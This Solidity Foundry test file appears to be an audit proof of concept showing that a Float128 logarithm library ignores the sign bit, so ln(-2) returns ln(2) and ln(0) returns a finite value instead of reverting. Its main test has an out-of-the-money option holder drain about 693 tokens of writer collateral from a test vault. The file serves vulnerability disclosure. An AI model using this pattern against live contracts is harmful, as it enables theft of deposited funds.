// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {packedFloat} from "../src/Types.sol";
import {Float128} from "../src/Float128.sol";
import {Ln} from "../src/Ln.sol";
import {MiniERC20} from "../src/consumer/MiniERC20.sol";
import {SpreadOptionVault} from "../src/consumer/SpreadOptionVault.sol";

/// @title PoC — AuditVault 55705 / Code4rena Forte H-03
/// @notice Forte's `Ln.ln` (src/Ln.sol) reads `mantissa := and(input, MANTISSA_MASK)` and
/// NEVER inspects `MANTISSA_SIGN_MASK` (bit 240), so for a negative input it silently computes
/// `ln(|input|)` and for zero it returns a finite garbage value — instead of reverting on the
/// invalid (non-positive) log domain.
///
/// This PoC deploys the REAL (byte-identical, audited-commit) Float128 + Ln library and a
/// minimal REAL consumer (`SpreadOptionVault`) that prices a cash-settled log-contract option
/// as `notional * ln(settlePrice - strike)`. An OUT-OF-THE-MONEY holder (settlePrice < strike,
/// a worthless option) supplies a negative `delta` to `ln`; because `ln` does not revert, the
/// vault pays the holder exactly as if the option were in the money, draining writer collateral.
contract PoC_55705_ForteLn is Test {
    using Float128 for packedFloat;

    // Must match foundry.toml `libraries` link for Ln (0x6c6e = "ln").
    address internal constant LN_LIB = 0x0000000000000000000000000000000000006C6E;

    MiniERC20 internal asset;
    SpreadOptionVault internal vault;

    address internal writer = address(0xBEEF);
    address internal attacker = address(0xA11CE5);

    function setUp() public {
        // Ln is a linked library pinned at LN_LIB; place its real runtime there.
        vm.etch(LN_LIB, type(Ln).runtimeCode);

        asset = new MiniERC20("USD Stable", "USD", 18);
        vault = new SpreadOptionVault(asset);

        // Writer backs the vault with 10,000 collateral tokens.
        asset.mint(writer, 10_000e18);
        vm.startPrank(writer);
        asset.approve(address(vault), type(uint256).max);
        vault.fund(10_000e18);
        vm.stopPrank();
    }

    /// @notice Core harm: an OTM holder steals ~693.15 collateral tokens from the writer.
    function testOtmHolderStealsWriterCollateral() public {
        packedFloat notional = Float128.toPackedFloat(1000, 0);
        packedFloat strike = Float128.toPackedFloat(100, 0);

        // (A) CONTROL — an in-the-money holder (settle 102 > strike 100). Legitimate payout.
        uint256 idItm = vault.open(writer, notional, strike);
        uint256 payItm = vault.settle(idItm, Float128.toPackedFloat(102, 0)); // delta = +2

        // (B) THEFT — an out-of-the-money holder (settle 98 < strike 100). Option is WORTHLESS
        //     and a spec-correct ln(delta<0) would revert -> payout MUST be 0.
        uint256 attackerBefore = asset.balanceOf(attacker);
        uint256 collateralBefore = vault.collateral();

        uint256 idOtm = vault.open(attacker, notional, strike);
        uint256 payOtm = vault.settle(idOtm, Float128.toPackedFloat(98, 0)); // delta = -2

        uint256 attackerGained = asset.balanceOf(attacker) - attackerBefore;
        uint256 collateralLost = collateralBefore - vault.collateral();

        emit log_named_uint("ITM payout (legitimate)", payItm);
        emit log_named_uint("OTM payout (should be 0)", payOtm);
        emit log_named_uint("attacker gained (asset wei)", attackerGained);
        emit log_named_uint("vault collateral lost (asset wei)", collateralLost);

        // The sign bit was ignored: an out-of-the-money (delta = -2) position is paid the
        // SAME amount as an in-the-money (delta = +2) position.
        assertEq(payOtm, payItm, "sign ignored: OTM paid identically to ITM");
        // Real ERC20 theft of >600 tokens on a position that should have paid nothing.
        assertGt(payOtm, 600e18, "attacker extracted >600 collateral tokens on a worthless option");
        assertEq(attackerGained, payOtm, "harm is a real asset balance delta to the attacker");
        assertEq(collateralLost, payOtm, "writer collateral drained by exactly the stolen amount");
        // Exact number (ln(2) * 1000 at 18 decimals).
        assertEq(payOtm, 693147180559945309417, "exact stolen amount");
    }

    /// @notice Negative control / mechanism proof: the OTM `delta` really is a NEGATIVE
    /// Float128 (sign bit set), so a spec-correct `ln` would revert and the theft is impossible;
    /// yet ln(-2) returns exactly ln(2), proving the missing domain check is the root cause.
    function testMechanism_NegativeInputSilentlyReturnsLnOfAbs() public {
        packedFloat strike = Float128.toPackedFloat(100, 0);
        packedFloat deltaOtm = Float128.toPackedFloat(98, 0).sub(strike); // -2
        packedFloat deltaItm = Float128.toPackedFloat(102, 0).sub(strike); // +2

        (int256 mOtm,) = Float128.decode(deltaOtm);
        assertLt(mOtm, 0, "OTM delta is a negative Float128 (log-domain invalid)");

        (int256 lnOtmM, int256 lnOtmE) = Float128.decode(Ln.ln(deltaOtm));
        (int256 lnItmM, int256 lnItmE) = Float128.decode(Ln.ln(deltaItm));
        // ln(-2) == ln(2) == 0.69314718055994530941723212145817656807
        assertEq(lnOtmM, lnItmM, "ln(-2) mantissa equals ln(2) mantissa");
        assertEq(lnOtmE, lnItmE, "ln(-2) exponent equals ln(2) exponent");
        assertEq(lnOtmM, 69314718055994530941723212145817656807, "ln(-2) silently returns ln(2)");
    }

    /// @notice Zero-domain violation (finding's second case): ln(0) returns a finite garbage
    /// value instead of reverting (true value is -infinity).
    function testMechanism_ZeroInputReturnsFiniteGarbage() public {
        packedFloat zero = Float128.toPackedFloat(0, 0);
        (int256 m, int256 e) = Float128.decode(Ln.ln(zero));
        emit log_named_int("ln(0) mantissa", m);
        emit log_named_int("ln(0) exponent", e);
        assertEq(m, -18781450104493291890957123580748043517, "ln(0) returns finite garbage");
        assertEq(e, -33, "ln(0) exponent");
    }
}
